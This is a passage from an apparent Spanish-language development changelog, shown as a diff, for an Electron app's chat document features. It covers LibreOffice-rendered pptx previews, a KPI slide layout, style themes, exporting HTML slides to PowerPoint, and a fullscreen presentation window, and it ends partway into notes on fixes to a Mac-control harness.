+  - **Aclaración importante que pidió el dueño**: esto SOLO cambia la VISTA PREVIA dentro del panel.
+    Lo que se descarga (`downloadChatDoc`) vuelve a generar el `.pptx` real desde cero, siempre — un
+    archivo completamente editable en PowerPoint, nunca el PDF. Son dos caminos de código
+    completamente separados; confirmado leyendo `extras-handlers.ts` antes de tocar nada: el botón de
+    descargar ya manda su propio pedido con `kind:'pptx'` explícito, sin depender de lo que haya
+    generado la vista previa.
+  - Nuevo `src/main/extras/office-render.ts`: `findSoffice()` (busca en rutas típicas de Mac/Windows,
+    cae a `which`/`where` del PATH, cacheado) y `convertToPdf()` (perfil de usuario temporal propio
+    por conversión — así varias conversiones a la vez no se bloquean entre sí por compartir perfil —,
+    con un timeout de 20s; `null` ante CUALQUIER falla, nunca lanza).
+  - **`chat-docs.ts`**: `generateChatDoc`, para `kind:'pptx'`, intenta `convertToPdf` después de
+    escribir el archivo; si da una ruta, el token queda con `kind:'pdf'` apuntando al PDF en vez de al
+    `.pptx`. Sin LibreOffice (o si la conversión falla por lo que sea), cae con gracia al
+    comportamiento de siempre — nunca rompe la generación.
+  - **Cero cambios en el renderer**: confirmado que la etiqueta del panel ("· PowerPoint") y el botón
+    de descarga sacan su `kind` del BLOQUE del chat (`pptx`), no de lo que main termina sirviendo
+    — así que la persona sigue viendo "PowerPoint" en el encabezado aunque el visor que se monte por
+    dentro sea el de PDF. `App.tsx` (el router del visor) ya elegía el componente según el `kind` que
+    manda la URL del token — sin tocar nada ahí tampoco.
+  - **Nunca se empaqueta ni se descarga solo** (sigue la decisión de la investigación de F8-B127): si
+    la persona que use la app NO tiene LibreOffice instalado, cae con gracia al visor estructural de
+    siempre — este camino es un "mejor si está", no un requisito nuevo.
+- **Pruebas nuevas**: `office-render.test.ts` (8, con `child_process`/`fs/promises` mockeados —
+  deterministas, no dependen de si la máquina que corre los tests tiene LibreOffice instalado de
+  verdad): detección por ruta típica/`which`, cacheo, conversión exitosa/fallida/timeout, perfil
+  temporal que no se puede crear. `chat-docs.test.ts` sumó 3 (con `convertToPdf` mockeado: éxito →
+  `kind:'pdf'`, falla → cae a `kind:'pptx'`, xlsx nunca llama a `convertToPdf`) — el test viejo de
+  "pptx da kind pptx" se reescribió para no depender de si ESTA máquina en particular tiene
+  LibreOffice instalado (ahora sí, por la instalación de recién) — antes fallaba por eso mismo, dato
+  real de por qué hacía falta mockearlo en vez de confiar en el entorno.
+- **Verificado**: typecheck (`node`) limpio, lint limpio (mismos warnings preexistentes, ajenos),
+  prettier limpio, batería completa del repo en verde — 5982 pruebas (23 skipped, Windows-only),
+  mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App reiniciada (se tocó
+  `chat-docs.ts`/`office-render.ts` en main; no se tocó `src/viewer/`, así que no hizo falta
+  `npm run build:viewer` esta vez).
+- **No verificado todavía**: confirmación del dueño viendo el panel con LibreOffice de verdad detrás.
+  Pendiente para una fase futura (no esta vuelta): el ciclo de revisión con VISIÓN (el modelo mira la
+  imagen renderizada y corrige errores de geometría antes de mostrarla) que investigó F8-B127 — esto
+  de hoy es "mostrar el render real", no "el modelo se corrige solo"; dado que el propio `fitText`
+  determinista viene andando razonablemente bien (verificado con números, no solo capturas), invertir
+  en el loop de visión queda con prioridad más baja por ahora.
+
+## F8-B133 — Nuevo layout "kpis" (fila de métricas): la causa real de "siempre la misma estética"
+
+- **El dueño comparó directamente, en PowerPoint real, nuestro archivo contra uno generado por Claude
+  Desktop con el mismo tipo de contenido** ("funciona del hoyo wn siempre hace la misma puta estética
+  no cambia no varía", con ambos `.pptx` en el Escritorio) — la referencia de Claude Desktop traía una
+  diapositiva que no existía en nuestro set de layouts: una fila de 2 a 4 métricas (etiqueta/número
+  grande/variación), tipo tablero — lo que en la jerga de reportes se llama "KPI row". Sin ese layout,
+  cualquier deck con ese tipo de contenido caía siempre en el mismo molde de título+viñetas, de ahí la
+  sensación de "nunca varía" aunque el resto de layouts (`stat`/`steps`/`two-col`/`cards`/`chart`) ya
+  estuvieran todos implementados.
+  - **Nuevo layout `"kpis"`**: `spec.kpis` es un array de 2 a 4 `{label, value, delta?}` — cada métrica
+    sale como una tarjeta (`roundRect` con borde y fondo `surface`) en fila, con la etiqueta chica
+    arriba, el número grande en el medio y la variación (si viene) abajo en el color de acento. Con
+    menos de 2 `kpis`, cae con gracia al layout `"bullets"` de siempre (igual que el resto de layouts
+    con datos faltantes) — nunca se arma una fila vacía o de una sola tarjeta.
+  - **Esquema**: `src/shared/chat-doc-spec.ts` gana `PptxKpiSpec`, `isKpiSpec()`,
+    `MAX_KPIS=4`/`MIN_KPIS=2`/`MAX_KPI_LABEL_CHARS=40`/`MAX_KPI_VALUE_CHARS=16`/`MAX_KPI_DELTA_CHARS=40`,
+    y `"kpis"` se suma a `PPTX_LAYOUTS`. `src/main/ipc/schemas.ts` gana el validador IPC equivalente
+    (`pptxKpi`/`pptxKpis`) — mismo patrón que `columns`/`eyebrow`/`note` de rondas anteriores.
+  - **Render**: `src/main/extras/render-pptx.ts` gana `addKpisSlide()` sobre el mismo sistema de diseño
+    de F8-B129 (paleta de 14 tonos, `addContentHeader` compartido, pie de página) — ancho de cada
+    tarjeta calculado según cuántas `kpis` vengan (2, 3 o 4), nunca un tamaño fijo que se vea apretado
+    o vacío.
+  - **Verificado visualmente contra la referencia real**: se armó un `.pptx` de prueba con el mismo
+    contenido de ejemplo del archivo de Claude Desktop (ventas totales/clientes nuevos/retención),
+    convertido a PDF vía la integración de LibreOffice de F8-B132 y comparado lado a lado — la
+    composición (fila de tarjetas, jerarquía label/número/variación) queda equivalente a la
+    referencia; detalle de paleta/tipografía sigue el tema elegido, no copia los colores exactos del
+    archivo ajeno.
+  - **Prompt del agente actualizado en los dos lugares sincronizados**
+    (`resources/opencode/agents/chat.md` y `src/main/opencode/config.ts`): se documenta `"kpis"` en la
+    lista de `layout`, su forma exacta (`kpis: [{label, value, delta?}]`), la distinción explícita con
+    `"stat"` (UNA cifra foco de toda la diapositiva vs. VARIAS métricas juntas más chicas) y se agrega
+    a la lista de "variá el tipo de diapositiva para que no se vea hecho por IA".
+- **Pruebas nuevas**: `chat-doc-spec.ts`/`schemas.ts` — aceptación de 2 a 4 `kpis`, rechazo de 1 o 5,
+  rechazo de `kpi` sin `label`/`value` (con el ciclo de borrar-con-`sed`-y-restaurar de siempre para
+  confirmar que el test de verdad habría fallado sin el campo declarado). `render-pptx.test.ts` suma 2:
+  el layout `"kpis"` con 2 a 4 métricas arma las tarjetas y textos esperados, y con menos de 2 cae a
+  `"bullets"`.
+- **Verificado**: typecheck (los 4: node/web/pwa/viewer) limpio, lint limpio (mismos 8 warnings
+  preexistentes y ajenos de siempre), batería completa del repo en verde — 5862 pruebas (23 skipped,
+  Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts`, `ENOEXEC` en Mac). App
+  reiniciada (se tocó `chat-doc-spec.ts`/`schemas.ts`/`render-pptx.ts` en main; no se tocó
+  `src/viewer/`, así que no hizo falta `npm run build:viewer` esta vez).
+- **No verificado todavía**: confirmación del dueño viendo la fila de KPIs dentro de la app con un
+  pedido real (el layout no se infiere solo, hay que pedirlo a propósito — mismo criterio que
+  `stat`/`steps`/etc. — p.ej. "un resumen con las métricas principales en fila" o "ventas totales,
+  clientes nuevos y retención en una fila al principio").
+
+## F8-B134 — Eje de "estilo" en PowerPoint: por qué nunca variaba de verdad, y qué se hizo
+
+- **El dueño insistió, en rondas sucesivas, en que la presentación "siempre hace la misma estética"**
+  ("cambiale los colores y formato", "cambiame la estética total compadre", "porque la estetica es
+  igual no la varia como que la ia estuviera manipulada o capeada") — pidió investigar cómo lo hacen
+  Claude.ai/ChatGPT/Codex y, en base a eso, decidir qué hacer.
+  - **Confirmado leyendo el código, no por sospecha**: `render-pptx.ts` solo tenía DOS perillas por
+    diapositiva — `theme` (5 paletas de color fijas) y `layout` (10 plantillas con geometría 100% fija
+    en código) — nunca tipografía de forma, decoración, bordes de tarjeta ni alineación. El agente
+    nunca controlaba posición ni forma, solo contenido + qué layout usar — de ahí que "cambiar la
+    estética" en la práctica solo pudiera recolorear.
+  - **Por qué Claude.ai/ChatGPT/Codex sí logran "cualquier estilo"**: corren código (python-pptx/
+    openpyxl) en un sandbox, con libertad real de posición/forma, y antes de entregar el archivo hacen
+    una vuelta de "generar → renderizar → mirar con visión → corregir" que detecta y arregla
+    superposición/desborde. **Se revisó si Lazunox ya tiene esa vuelta en algún lado — no la tiene**:
+    ni el Chat de hoy (agente de texto plano, sin terminal ni archivos, por diseño) ni la skill `pptx`
+    de modo Tareas (revisada: es una plantilla de una sola pasada: ni siquiera puede abrir el archivo
+    para mirarlo en su propio sandbox). Replicar eso de cero es un proyecto bastante más grande (nueva
+    capacidad de visión en el loop del agente) y reintroduce el riesgo real que ya se vio esta sesión
+    (títulos cortados, texto encimado en la diapositiva 6) mientras se afina — se dejó anotado como
+    fase futura, no esta vuelta.
+  - **Decisión tomada**: en vez de eso, un eje de ESTILO real (forma/decoración/tipografía),
+    independiente del color, manteniendo intacta toda la matemática de posición/tamaño que ya
+    funciona bien — nunca se tocó un solo `x`/`y`/`w`/`h`, solo qué parámetros de dibujo se usan en
+    las mismas llamadas de `addShape`/`addText`.
+  - **Nuevo `src/main/extras/pptx-design.ts`**: `StyleParams` (`bleedShape`, `cardRadius`,
+    `cardBorder`, `cardFill`, `titleAlign`, `ruleUnderEyebrow`, `numberBadge`) y `STYLES` con 4
+    valores — `"classic"` (el look de siempre, DEFAULT — cero cambio visual para quien no pide nada
+    nuevo), `"editorial"` (línea fina de borde a borde en vez del círculo, tarjetas de esquina recta
+    sin relleno — tono revista/sobrio), `"geometric"` (barra diagonal de acento, tarjetas bien
+    redondeadas tipo "pill" — tono gráfico/audaz), `"minimal"` (sin ninguna decoración, tarjetas de
+    esquina recta solo con borde — tono informe ejecutivo ultra limpio).
+  - **`render-pptx.ts`**: `StyleParams` se enhebra junto a `Palette` en cada `addXxxSlide`.
+    `addBleedCircle` se generalizó a `addBleedDecoration` (círculo/diagonal/línea/nada, en la MISMA
+    zona de esquina ya probada que nunca pisa texto). `addEyebrow` ganó un "tick" de color opcional a
+    la IZQUIERDA de la etiqueta (NUNCA una línea debajo: en "section"/"closing" el espacio entre
+    etiqueta y título ya es chico — ver sus propios `y` — y una línea ahí arriesgaba pisar el título;
+    un tick al costado no compite por espacio vertical). `addCardsSlide`/`addKpisSlide` pasan a usar
+    `s.cardRadius`/`cardBorder`/`cardFill`. `addStepsSlide`/`addCardsSlide` respetan `s.numberBadge`.
+    `addTwoColSlide` queda sin cambios de estilo (sus paneles son el contraste antes/después con el
+    color del tema, no "tarjetas").
+  - **Bug real encontrado con la verificación visual, no solo con el XML** (disciplina ya establecida
+    esta sesión tras el bug del `9cqw`, F8-B131): `rectRadius: 0` en `pptxgenjs` NUNCA llegaba al
+    archivo — confirmado leyendo su fuente, el chequeo es `if (slideItemObj.options.rectRadius)`, y
+    `0` es falsy en JS, así que nunca escribía el `adj` de la esquina; PowerPoint/LibreOffice caía al
+    radio PROPIO del preset `roundRect` (visiblemente redondeado), no a la esquina recta que pedían
+    `"editorial"`/`"minimal"`. Se vio clarísimo generando un `.pptx` real por estilo, convirtiéndolo a
+    PDF con la integración de LibreOffice (F8-B132) y mirando el render de verdad — las aserciones de
+    XML por sí solas no lo habrían agarrado. Arreglado con un `cardShape(s)` que usa `"rect"` liso en
+    vez de `"roundRect"` cuando `cardRadius` es 0.
+  - **Prompt del agente, los dos lugares sincronizados** (`chat.md`/`config.ts`): `style` documentado
+    junto a `theme`, con una frase por valor y cuándo pega cada uno; la guía de variedad ahora pide
+    variar AMBOS ejes ("no dejes ni 'blue' ni 'classic' por inercia").
+- **Pruebas nuevas**: `pptx-design.test.ts` suma un describe para `STYLES` (los 4 existen, rangos
+  válidos). `render-pptx.test.ts` suma 4: sin `style` el resultado es byte-idéntico a `style:
+"classic"` (cero regresión), la decoración de cover/section/stat/closing cambia según el estilo
+  (incluida la verificación explícita de `"rect"` liso vs. `"roundRect"` para radio 0, tras encontrar
+  el bug de arriba), la forma de tarjeta en `cards`/`kpis` cambia (radio/relleno/borde), y el valor
+  por defecto se comporta como `"classic"` aunque se declare explícito.
+- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes y ajenos),
+  batería completa del repo en verde — 5872 pruebas (23 skipped, Windows-only), mismo ruido ajeno de
+  siempre (`computer/service-win.test.ts`, `ENOEXEC` en Mac). Verificación visual manual: un `.pptx`
+  por estilo con el mismo contenido (portada/KPIs/tarjetas), convertido a PDF vía LibreOffice y
+  revisado página por página — confirmada la decoración distinta en cada uno, el bug del radio 0
+  encontrado y corregido, y ninguna superposición/corte de texto en ningún estilo. App reiniciada (se
+  tocó `render-pptx.ts`/`pptx-design.ts`/`chat-doc-spec.ts`/`schemas.ts` en main; no se tocó
+  `src/viewer/`, así que no hizo falta `npm run build:viewer`).
+- **No verificado todavía**: confirmación del dueño generando las 4 combinaciones de estilo en la app
+  y abriéndolas en PowerPoint real (no solo el visor/LibreOffice).
+
+## F8-B135 — Descargar un deck `​```slides` como PowerPoint proyectable (imagen por diapositiva)
+
+- **El dueño pidió que el camino HTML libre (`​```slides`, mejor estética que el `​```pptx`
+  estructurado) pudiera además abrirse en PowerPoint y proyectarse** — "que tenga la misma función
+  que Claude [Desktop], que deje proyectarlo" — poniendo como referencia a Gamma.app.
+  - **Investigado cómo lo hace Gamma antes de construir nada**: tampoco genera `.pptx` nativo —
+    renderiza en su propio canvas web y exporta como conversión secundaria; sus propios usuarios
+    reportan en su foro oficial diapositivas que llegan como una sola imagen bloqueada o con texto
+    fragmentado. Confirma que ni siquiera una empresa dedicada 100% a esto tiene resuelto el "texto
+    de verdad editable después" — mismo límite real que ya se había encontrado.
+  - **Confirmado con el dueño** (pregunta directa): no hace falta que el texto quede editable en
+    PowerPoint después, alcanza con que el archivo se abra y se proyecte en pantalla completa como
+    cualquier `.pptx` normal — habilita el camino simple y confiable (imagen por diapositiva) en vez
+    de perseguir la conversión "elemento por elemento" que ni Gamma logra resolver.
+  - **Dos agentes Explore confirmaron, antes de diseñar nada**: el contrato CSS que ya se le pide al
+    agente (`.slide { width:960px; height:540px; page-break-after:always }`, apiladas en flujo NORMAL
+    de documento, nunca `position:absolute` entre ellas) — así que aislar una diapositiva por vez es
+    seguro; y que `​```slides` colapsaba a `kind:'pdf'` IDÉNTICO a un `​```html` cualquiera en TODA la
+    cadena (renderer→IPC→main), sin ninguna marca de "es un deck" que sobreviviera más allá del
+    fence-lang local — hubo que hacerla sobrevivir a propósito (ver abajo).
+  - **Nuevo `captureSlidesAsPngs`** (`src/main/extras/artifact-window.ts`): misma ventana oculta/
+    sandboxeada/CSP que `renderHtmlToPdf` (se duplicó su bloque de creación a propósito, en vez de
+    refactorizar para compartirlo, para no arriesgar ese camino que ya funciona), a 1920×1080 con
+    zoom 2x (diapositivas de 960×540 lógicos salen nítidas). Aísla una diapositiva por vez ocultando
+    el resto (`style.display`) en vez de scrollear por offset fijo: no depende de que la altura de
+    cada `<section>` calce exacto en píxeles — un `padding` sin `box-sizing:border-box` en el HTML
+    del agente habría roto un scroll por offset. Si el HTML no sigue el contrato `.slide` (0
+    encontradas), captura la página entera como una sola "diapositiva" — nunca falla por eso, degrada
+    con gracia (mismo criterio que la integración de LibreOffice, F8-B132).
+  - **Nuevo `src/main/extras/slides-deck-pptx.ts`**: `assembleSlidesPptx(images)`, PURO (sin
+    `electron`, a propósito — así se prueba con buffers de prueba, sin necesitar una `BrowserWindow`
+    real) — cada imagen a pantalla completa (`x=0,y=0`, 10×5.625in, mismo 16:9 que `render-pptx.ts`)
+    en su propia diapositiva, sin texto ni forma.
+  - **Nuevo `src/main/extras/slides-deck-export.ts`**: `downloadSlidesAsPptx` orquesta captura →
+    armado → el mismo diálogo nativo "Guardar como" que ya usa `downloadHtmlAsPdf` (destino SIEMPRE
+    lo elige la persona). Nombre de archivo DISTINTO de `render-pptx.ts` a propósito: ese otro archivo
+    arma el `​```pptx` ESTRUCTURADO (temas/estilos de F8-B129/F8-B134) — un mecanismo totalmente
+    distinto, nunca usado a la vez que `​```slides` para el mismo documento.
+  - **Plumbing para que "es un deck" sobreviva hasta el botón**: `isSlides` ahora viaja desde
+    `extractHtmlArtifacts` (`ArtifactButton.tsx`) → `ChatDocBlock` (`chatDocBlocks.ts`) →
+    `previewInChatDocPanel`/`openDoc` (`chatDocPreview.ts`/`useChatDocPanel.ts`) → el estado `doc` que
+    lee `ChatDocPanel.tsx`. El `kind` IPC (`'pdf'`) NO cambió — la vista previa sigue exactamente
+    igual; `isSlides` es pura información de UI para decidir qué botón de descarga extra mostrar.
+  - **Botón nuevo `DownloadSlidesPptxButton`** (`ArtifactButton.tsx`, mismo patrón que
+    `DownloadPdfButton`): visible SOLO cuando `isSlides` es `true`, al lado del de PDF, en los dos
+    lugares donde ese botón ya aparece (cabecera inline del bloque de código y header del panel
+    lateral). Tooltip explícito "para proyectar" (nueva clave `labels.ui.downloadSlidesPptx`,
+    es/en) para que no se confunda con "editable".
+  - **Prompt del agente: SIN CAMBIOS** — mismo criterio ya establecido para el botón de PDF ("la
+    persona ya tiene un botón... no hace falta que lo sepas ni lo menciones"): es un descubrimiento
+    de UI, no algo que el agente deba promocionar.
+  - **Nuevo canal IPC `extras:downloadSlidesAsPptx`** (`ipc-extras.ts`/`schemas.ts`/
+    `extras-handlers.ts`/`preload/extras-api.ts`), mismo shape que `extras:downloadHtmlAsPdf`
+    (`{title, html}` → ruta guardada o `null`). Clasificado `'X'` (no accesible desde control remoto)
+    en `remote/policy.ts`, mismo criterio que el canal de PDF — lo agarró la prueba de cobertura 100%
+    de canales (`policy.test.ts`), que obliga a clasificar cada canal nuevo explícitamente.
+- **Pruebas nuevas**: `slides-deck-pptx.test.ts` (3, puras — PNG de prueba de 1×1, confirma vía
+  `JSZip` una diapositiva por imagen en orden, cada una a pantalla completa en EMU exacto, sin ningún
+  `<a:t>` de texto). `captureSlidesAsPngs`/`downloadSlidesAsPptx` dependen de una `BrowserWindow`
+  real — mismo criterio que `renderHtmlToPdf`, que tampoco tiene test unitario.
+- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes), batería
+  completa del repo en verde — 5876 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
+  (`computer/service-win.test.ts`, `ENOEXEC` en Mac). `i18n-core-keys.json` (cobertura del núcleo de
+  i18n que carga la PWA al arrancar) regenerado con `UPDATE_PWA_I18N=1` — el diff trajo además 24
+  claves que ya estaban en uso pero no se habían sincronizado en rondas anteriores (`chat.doc.*`,
+  `tasks.learn.*`, `common.close`, `labels.ui.downloadPdf`), nunca una resta, confirmado antes de
+  aceptarlo. App reiniciada (se tocó main/preload/renderer).
+- **No verificado todavía — requiere interacción real con una ventana de Electron, no automatizable**:
+  generar un `​```slides` de verdad en la app, apretar "Descargar como PowerPoint (para proyectar)", y
+  abrir el `.pptx` resultante en PowerPoint/Keynote de verdad — confirmar que cada diapositiva
+  coincide con el HTML y que entra en modo presentación sin problema. Pendiente de que el dueño lo
+  pruebe (mismo motivo que para instalar LibreOffice en F8-B132: esto necesita manos reales en la app,
+  no algo que se pueda automatizar desde acá sin tocar la ventana en vivo del dueño).
+
+## F8-B136 — Dos bugs reales de la captura de diapositivas (F8-B135) + "Presentar" dentro de Lazunox
+
+- **El dueño probó F8-B135 en la app de verdad y encontró DOS bugs reales** que ninguna prueba
+  automática podía agarrar (necesitan una `BrowserWindow` real, ya se había anotado esa limitación en
+  F8-B135) — y de paso aclaró que lo que en el fondo necesitaba no era un archivo `.pptx`, sino poder
+  **proyectar la presentación DENTRO de Lazunox**, sin pasar por PowerPoint.
+  - **Bug 1 — la captura se quedaba esperando para siempre**: `capturePage()` (a diferencia de
+    `printToPDF()`, que sí funcionaba) necesita que la ventana esté REALMENTE compositada por
+    Chromium; con `show:false` sola, Chromium nunca llega a pintar un frame de una ventana invisible
+    (lo salta para ahorrar recursos) y la captura no resolvía nunca. Arreglado con el mismo truco que
+    ya usa el modo E2E sin pantalla de la propia app (`e2e-headless.ts`'s `presentWindow`): opacidad 0
+    - sin eventos de mouse + `showInactive()` — invisible para la persona, pero el compositor la trata
+      como una ventana real.
+  - **Bug 2 — intentar más nitidez con zoom deformaba las diapositivas**: se había agregado
+    `setZoomFactor(2)` DESPUÉS de que la página ya maquetó a tamaño normal, así que cualquier elemento
+    medido por JS (p.ej. un gráfico) quedaba calculado para un tamaño y pintado en otro — estirado/
+    desformado. Arreglado sacando el zoom por completo: la ventana nace 1:1 con el contrato CSS del
+    agente (960×540), sin ningún truco — mismo criterio que `renderHtmlToPdf`, que tampoco hace zoom.
+  - **Bug 3 (encontrado al arreglar el 1) — posicionar la ventana fuera de pantalla rompía la
+    nitidez**: para garantizar que la ventana de captura nunca se viera, además de la opacidad 0 se la
+    posicionaba en coordenadas muy negativas (fuera de cualquier monitor real). Eso le hacía perder a
+    Electron la referencia de qué pantalla usar, y caía a densidad de píxeles 1x en vez de la 2x
+    (Retina) del monitor real del dueño — las imágenes salían sin nitidez. Arreglado sacando el
+    posicionamiento fuera de pantalla: la opacidad 0 + `showInactive()` ya alcanzan solas para que
+    nunca se vea, sin perder la densidad real de la pantalla.
+  - **"Presentar" dentro de Lazunox (lo que el dueño en realidad pedía)**: nuevo botón `Presentation`
+    (ícono distinto al de "Descargar PowerPoint", para no confundirlos — el dueño pidió explícitamente
+    mantener los dos) junto al bloque `​```slides` en el chat. Al apretarlo, abre el panel de documento
+    (si no estaba abierto) y pone la VENTANA PRINCIPAL en pantalla completa de VERDAD del sistema
+    operativo (`BrowserWindow.setFullScreen(true)`, no solo el panel adentro de la ventana) mostrando
+    el HTML/PDF real — sin ninguna captura de imagen de por medio, así que siempre nítido, a
+    diferencia del camino de descarga. Se sale con Escape (ya había un listener de Escape del visor
+    nativo, reusado) o cerrando el panel.
+    - El botón de "ampliar" que ya existía en el header del panel (`Maximize2`/`Minimize2`) también
+      entra/sale de pantalla completa de verdad del SO ahora, pero SOLO cuando el documento es un
+      `​```slides` — para cualquier otro tipo (PDF normal, Excel, PowerPoint estructurado) sigue
+      siendo nada más que "ampliar dentro de la ventana", como siempre: no tiene sentido "proyectar"
+      una planilla de cálculo.
+  - **Nuevo canal IPC `extras:chatDoc:setHostFullscreen`** (`ipc-extras.ts`/`schemas.ts`/
+    `extras-handlers.ts`), clasificado `'X'` en `remote/policy.ts` (mismo criterio que el resto de
+    `chatDoc:*`). `previewInChatDocPanel`/`openDoc` ganaron un parámetro `present` — al terminar de
+    generarse el documento, si se pidió presentar, entra en pantalla completa automáticamente (no
+    hace falta esperar a que la persona aprete otro botón más).
+- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes), batería
+  completa del repo en verde — 5877 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
+  (`computer/service-win.test.ts`, `ENOEXEC` en Mac). `i18n-core-keys.json` regenerado con
+  `UPDATE_PWA_I18N=1` (una clave nueva, `labels.ui.presentSlides`). App reiniciada.
+- **No verificado todavía — requiere interacción real con la app, no automatizable**: que el dueño
+  confirme que (a) el `.pptx` descargado ahora sale nítido y sin deformar, y (b) el botón "Presentar"
+  realmente pone la pantalla completa y se ve la presentación de verdad, saliendo bien con Escape.
+
+## F8-B137 — "Presentar" rehecho: ventana propia, no la ventana principal
+
+- **El dueño probó el "Presentar" de F8-B136 y mandó una captura**: al apretarlo, la ventana principal
+  seguía mostrando el sidebar de Lazunox, los controles de zoom/página del visor de PDF y el resto del
+  chrome de la app — no se parecía en nada a una presentación. El diseño de F8-B136 (poner la ventana
+  PRINCIPAL en pantalla completa del sistema, reusando el panel lateral) estaba mal de raíz: pantalla
+  completa del sistema operativo solo hace que LA VENTANA ocupe toda la pantalla — no oculta nada de
+  lo que esa ventana ya dibuja adentro (el sidebar de navegación, que vive en `App.tsx`, está fuera
+  del control de `ChatView`/el panel de documento). Mientras sea "la app entera", nunca se iba a ver
+  como una presentación de verdad, sin importar cuánto se ocultara adentro del panel.
+  - **Rediseño**: `presentSlides()`, nueva función en `artifact-window.ts` — una ventana PROPIA (no la
+    principal), sin marco, que carga el HTML del deck (misma sesión/CSP aislada que `openArtifact`) y
+    apenas termina de cargar: inyecta un ajuste de escala (`document.body.style.zoom`, calculado como
+    `min(ancho pantalla/960, alto pantalla/540)` — mantiene la proporción 16:9 del contrato CSS del
+    agente, con barras negras si la pantalla no es exactamente 16:9) y entra en pantalla completa de
+    verdad. Como es una ventana APARTE que solo tiene el HTML, no hay nada de la app que ocultar —
+    nunca se ve ni el sidebar ni ningún control.
+    - Sale con Escape (mismo patrón `before-input-event` que ya usa el visor nativo) o con los
+      controles de pantalla completa del propio sistema operativo (`leave-full-screen` cierra la
+      ventana — no tiene sentido fuera de pantalla completa, es sin marco y sin controles propios).
+  - **Se dio de baja el intento anterior**: el canal IPC `extras:chatDoc:setHostFullscreen`, el
+    parámetro `present` de `previewInChatDocPanel`/`openDoc`, y el `doc?.isSlides` especial del botón
+    de "ampliar" del panel — todo relacionado a poner la ventana PRINCIPAL en pantalla completa.
+    Reemplazado por el nuevo canal `extras:presentSlides` (mismo payload que `downloadHtmlAsPdf`:
+    `{title, html}` → `void`), clasificado `'X'` en `remote/policy.ts`.
+  - El botón "Presentar" (mismo ícono `Presentation`) ahora llama directo a `extras.presentSlides(...)`
+    — ya no depende de que el panel esté abierto ni de ningún estado de React compartido. Sigue
+    disponible en los dos lugares de antes (el bloque del chat y el header del panel, por si ya estaba
+    abierto), ambos llaman a la misma función nueva.
+- **Verificado**: typecheck (los 4) limpio, lint limpio, batería completa del repo en verde — 5877
+  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac). `policy.test.ts`
+  (cobertura 100% de canales) y `i18n-core.test.ts` en verde con el canal/claves nuevos. App reiniciada.
+- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora sí
+  se ve como una presentación de verdad (pantalla negra, solo la diapositiva, sin nada de la app
+  alrededor), que escala bien a su pantalla, y que Escape/salir de pantalla completa cierra limpio.
+
+## F8-B138 — "Presentar": una diapositiva por vez, con flechas, no scroll hacia abajo
+
+- **El dueño: "me gusta pero la idea es que sea como presentación para el lado, no para abajo, como si
+  fueran diapositivas"** — F8-B137 ya mostraba la ventana propia en pantalla completa, pero las
+  diapositivas quedaban todas apiladas en flujo normal (igual que en el PDF) y la única forma de
+  avanzar era scrollear hacia abajo por una página larga — no se sentía como una presentación de
+  verdad, donde se avanza diapositiva por diapositiva.
+  - Mismo truco ya probado en `captureSlidesAsPngs` (F8-B135): el script que se inyecta en
+    `presentSlides` ahora oculta todas las `.slide` menos la actual (`display:none`), mostrando una
+    sola a pantalla completa por vez. Flecha derecha, espacio o clic avanzan; flecha izquierda
+    retrocede — nunca pasa de la primera ni de la última. El `body` pasa a `display:flex` centrado,
+    así la diapositiva visible queda centrada en pantalla (antes, sin esto, con letterboxing quedaba
+    pegada arriba a la izquierda en vez de centrada).
+- **Verificado**: typecheck limpio, lint limpio (mismos 8 warnings preexistentes). Sin cambios de
+  tipos ni de superficie IPC (todo el cambio es el script JS inyectado dentro de `presentSlides`), así
+  que no hace falta tocar pruebas existentes. App reiniciada.
+- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora
+  avanza diapositiva por diapositiva con las flechas/clic, centrada, y no como una página larga.
+
+## F8-B139 — "Presentar": la diapositiva no quedaba bien encuadrada
+
+- **El dueño: "no las cuadra bien como diapositivas"** tras F8-B138 — bug real en el script de ajuste:
+  el `zoom` se aplicaba directo sobre `body`, el mismo elemento que tenía que centrarse con flexbox a
+  `100vw`/`100vh` — mezclar `zoom` con unidades de viewport en el MISMO elemento lo descuadraba (el
+  `body` nunca llegaba a medir el ancho real de la pantalla, así que no había nada que centrar).
+  - Separado: `body` queda SIN zoom, a tamaño real de pantalla (`width:100vw;height:100vh`), y centra
+    con flexbox a la diapositiva adentro; el `zoom` se aplica ahora directo a cada `.slide` (el
+    elemento con el tamaño fijo de 960×540 del contrato del agente) — la diapositiva se escala, el
+    contenedor la centra, cada uno en su propio elemento, sin pisarse.
+- **Verificado**: typecheck limpio. Sin cambios de tipos/IPC (solo el script JS inyectado). App
+  reiniciada.
+- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora sí
+  queda bien encuadrada/centrada en su pantalla.
+
+## F8-B140 — Cowork (Control del Mac): por qué Claude lo logra y nosotros no — primera tanda de arreglos reales
+
+- **El dueño comparó una tarea real** ("conectate a un PC remoto por Windows App y creame una carpeta")
+  corrida en Claude (salió bien) contra la misma corrida en Lazunox (falló con varios errores) —
+  "¿usaron la misma IA?" Se investigó a fondo (agente Opus, documentación pública de Anthropic +
+  lectura real del código de `src/main/computer/`) antes de tocar nada: **no es el modelo, son bugs
+  reales y concretos en el harness de Lazunox**, confirmados con cita exacta de archivo:línea.
+  - **Bug 1 (el más grave, encontrado primero) — timeout de 15s aplicado a TODO, incluidas las
+    tarjetas que esperan al dueño**: OpenCode aplica un único valor de timeout a cada llamada al MCP
+    de Control del Mac — no hay uno aparte por herramienta. `request_access`/`request_full_control`/
+    `teach_step` esperan sin límite a que el dueño responda una tarjeta (dice el propio código:
+    "ESPERA sin límite de tiempo"), pero con 15s de timeout del lado de OpenCode, esas llamadas
+    timeaban solas mientras el dueño todavía estaba mirando la tarjeta — exactamente los "tres
+    intentos seguidos" que vio. Subido a 10 minutos (`service.ts`), con el razonamiento completo en
+    el comentario: las herramientas de acción normal (clic, tipeo, captura) ya tienen su propio límite
+    más corto (30s) adentro y siempre responden bien antes, así que en la práctica el valor nuevo
